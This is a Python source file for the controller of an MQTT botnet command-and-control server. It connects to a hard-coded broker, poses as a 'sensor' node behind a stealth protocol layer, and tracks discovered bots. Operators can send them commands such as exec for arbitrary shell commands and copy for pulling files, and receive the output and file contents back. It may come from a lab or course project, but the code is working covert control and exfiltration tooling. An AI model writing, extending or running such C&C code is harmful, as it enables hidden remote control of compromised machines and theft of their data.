"""
Controller - MQTT C&C Server using layered protocol stack.
"""
import random
import time
import paho.mqtt.client as mqtt
import json
from protocol import ProtocolStack, StealthProtocolStack, deserialize_packet

import os

# --- CONFIGURATION ---
BROKER = "147.32.82.209"
PORT = 1883
TOPIC = "sensors"
SALT = "S4ur0ns_S3cr3t_S4lt_2025"
SEND_INTERVAL = 1.0
ID_SCAN_TIME = 2.0  # Seconds to scan for existing IDs
USE_STEALTH_MODE = os.environ.get("USE_STEALTH_MODE", "True").lower() == "true"
DEBUG = os.environ.get("DEBUG", "False").lower() == "true"

# Track discovered bots
discovered_bots = set()


def scan_existing_ids(broker: str, port: int, topic: str, scan_time: float) -> set:
    """Scan the network for 2 seconds to find existing sensor IDs."""
    existing_ids = set()
    
    def on_message(client, userdata, msg):
        try:
            # Use protocol deserializer instead of json.loads
            data = deserialize_packet(msg.payload)
            sensor_id = data.get("sensor_id", "")
            if sensor_id.startswith("sensor_"):
                existing_ids.add(sensor_id)
        except:
            pass
    
    def on_connect(client, userdata, flags, reason_code, properties):
        client.subscribe(topic)
    
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
    client.on_connect = on_connect
    client.on_message = on_message
    client.connect(broker, port, 60)
    client.loop_start()
    
    time.sleep(scan_time)
    
    client.loop_stop()
    client.disconnect()
    
    return existing_ids


def generate_unique_hub_id(existing_ids: set) -> str:
    """Generate a unique hub ID (always ends with 1)."""
    while True:
        hub_id = f"sensor_{random.randint(100, 999)}1"
        
        if hub_id not in existing_ids:
            return hub_id


def handle_message(message: dict):
    """Handle incoming messages from the protocol stack."""
    msg_type = message.get("type")
    target = message.get("target")
    sender = message.get("sender")
    
    # Track any bot that responds
    # Track any bot that responds
    if sender:
        discovered_bots.add(sender)
    
    # Only handle responses targeted at us
    if msg_type != "response":
        return
    if target != "ME":
        return
    
    output = message.get("output", "")
    print(f"\n[+] RESPONSE from {sender}:\n{output}\n")
    
    if output.startswith("FILE_START:"):
        print("(File content received)")


def parse_command(cmd_str: str) -> tuple:
    """
    Parse command string, supporting @target syntax.
    
    Examples:
        'ping'              -> ('ALL', 'ping', '')
        '@sensor_1234 ping' -> ('sensor_1234', 'ping', '')
        '@sensor_1234 ls /tmp' -> ('sensor_1234', 'ls', '/tmp')
    """
    parts = cmd_str.split()
    if not parts:
        return None, None, None
    
    # Check for @target prefix
    if parts[0].startswith("@"):
        target = parts[0][1:]  # Remove @ prefix
        if len(parts) < 2:
            return target, None, None
        cmd = parts[1]
        arg = " ".join(parts[2:]) if len(parts) > 2 else ""
    else:
        target = "ALL"
        cmd = parts[0]
        arg = " ".join(parts[1:]) if len(parts) > 1 else ""
    
    return target, cmd, arg


if __name__ == "__main__":
    # Scan for existing IDs to avoid collisions
    print(f"[*] Scanning for existing nodes ({ID_SCAN_TIME}s)...")
    existing_ids = scan_existing_ids(BROKER, PORT, TOPIC, ID_SCAN_TIME)
    
    if existing_ids:
        print(f"[*] Found {len(existing_ids)} existing nodes")
        # Add existing bots to discovered set
        for sid in existing_ids:
            if not sid.endswith("1"):
                discovered_bots.add(sid)
    
    # Generate unique hub ID
    CONTROLLER_ID = generate_unique_hub_id(existing_ids)
    
    # Create and start protocol stack
    StackClass = StealthProtocolStack if USE_STEALTH_MODE else ProtocolStack
    stack = StackClass(
        node_id=CONTROLLER_ID,
        broker=BROKER,
        port=PORT,
        topic=TOPIC,
        salt=SALT,
        send_interval=SEND_INTERVAL,
        debug=DEBUG
    )
    
    mode_str = "STEALTH" if USE_STEALTH_MODE else "FINGERPRINT"
    
    import sys

    # Track TX message IDs to filter echoes
    tx_message_ids = set()

    def progress_handler(msg_id, seq, total, direction):
        """Render progress bar."""
        # Track TX messages
        if direction == "TX":
            tx_message_ids.add(msg_id)
        
        # Skip RX progress for echoed TX messages (MQTT echo)
        if direction == "RX" and msg_id in tx_message_ids:
            if seq == total:
                tx_message_ids.discard(msg_id)  # Clean up
            return
        
        # Determine bar width
        bar_len = 20
        filled_len = int(round(bar_len * seq / float(total)))
        percents = round(100.0 * seq / float(total), 1)
        bar = '=' * filled_len + '-' * (bar_len - filled_len)
        
        # Message ID short
        mid = f"{msg_id:08x}"
        
        # Overwrite line
        sys.stdout.write(f"\r[{direction}] {mid} [{bar}] {percents}% ({seq}/{total})")
        sys.stdout.flush()
        
        if seq == total:
             sys.stdout.write("\n") # New line on completion
             sys.stdout.flush()

    # Register message handler
    stack.on_receive(handle_message)
    stack.set_progress_callback(progress_handler)
    
    print("--- MQTT SECURE STEALTH C&C ---")
    print(f"Controller ID: {CONTROLLER_ID} (sending every {SEND_INTERVAL}s)")
    print(f"Chunk size: {stack.get_chunk_size()} bytes")
    print("Commands: ping, w, ls <dir>, id, copy <file>, exec <cmd>")
    print("Targeting: @sensor_XXXX <cmd> (or just <cmd> for ALL)")
    print("Special: list (show discovered bots)")
    
    stack.start()
    
    try:
        while True:
            cmd_str = input("C&C> ").strip()
            if not cmd_str:
                continue
            if cmd_str == "exit":
                break
            
            # Special command: list discovered bots
            if cmd_str == "list":
                if discovered_bots:
                    print(f"\n[*] Discovered bots ({len(discovered_bots)}):")
                    for bot_id in sorted(discovered_bots):
                        print(f"    {bot_id}")
                    print()
                else:
                    print("\n[*] No bots discovered yet. Try 'ping' first.\n")
                continue
            
            target, cmd, arg = parse_command(cmd_str)
            
            if not cmd:
                print("[!] Invalid command format")
                continue
            
            stack.send(target, "command", cmd=cmd, arg=arg)
            target_str = target if target != "ALL" else "all bots"
            print(f"[*] Command '{cmd}' sent to {target_str}")
    except KeyboardInterrupt:
        pass
    
    stack.stop()
    print("\n[*] Controller stopped.")